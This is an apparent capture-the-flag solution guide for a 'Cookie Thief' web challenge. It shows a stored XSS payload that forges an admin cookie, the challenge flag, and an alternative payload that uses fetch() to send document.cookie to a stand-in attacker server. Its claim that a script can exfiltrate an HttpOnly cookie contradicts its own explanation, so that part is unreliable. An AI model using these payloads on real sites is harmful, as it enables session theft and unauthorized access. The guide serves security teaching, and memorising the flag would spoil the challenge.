# Solution Guide: Cookie Thief Challenge

This document provides the solution method for the "Cookie Thief" web challenge.

## Challenge Summary
The challenge involves exploiting an XSS vulnerability to steal an admin cookie, which is otherwise protected with the HttpOnly flag.

## Solution Steps

### Step 1: Explore the Application
1. Visit the login page at http://[challenge-url]/
2. Login with the credentials provided in the hint: username `user` and password `password`
3. After logging in, you'll be redirected to a dashboard where you can post messages

### Step 2: Identify the Vulnerability
The message board does not sanitize user input, making it vulnerable to Cross-Site Scripting (XSS) attacks. When you post a message, it is displayed exactly as submitted, including any HTML or JavaScript code.

### Step 3: Exploit the XSS Vulnerability
Post a JavaScript payload that will set your own admin cookie before the HttpOnly cookie is set:

```html
<script>
  document.cookie = 'admin=true; path=/';
  alert('Admin cookie set!');
</script>
```

When this script executes, it will:
1. Create an admin cookie with the value 'true'
2. Display an alert confirming the action

### Step 4: Access the Admin Panel
After the script executes and sets the admin cookie, navigate to:
```
http://[challenge-url]/admin_panel.php
```

Since you now have an admin cookie set (admin=true), you'll be granted access to the admin panel where the flag is displayed:

```
flag{c00k13_th3ft_1s_t00_3asy}
```

## Alternative Approach: Cookie Stealing
You could also set up a server to receive the stolen cookie:

1. Create a server that logs incoming requests (or use a service like RequestBin)
2. Post this XSS payload:
```html
<script>
  fetch('https://your-server.com/steal?cookie=' + document.cookie);
</script>
```
3. Check your server logs for the cookies

## Security Concepts Demonstrated
This challenge demonstrates:
1. **Cross-Site Scripting (XSS)**: The ability to inject and execute arbitrary JavaScript in a vulnerable web page
2. **The HttpOnly flag**: While the admin cookie has the HttpOnly flag (preventing JavaScript from reading it directly), we can bypass this protection by creating our own cookie
3. **Input Sanitization**: Proper input sanitization (e.g., using `htmlspecialchars()`) would have prevented this vulnerability 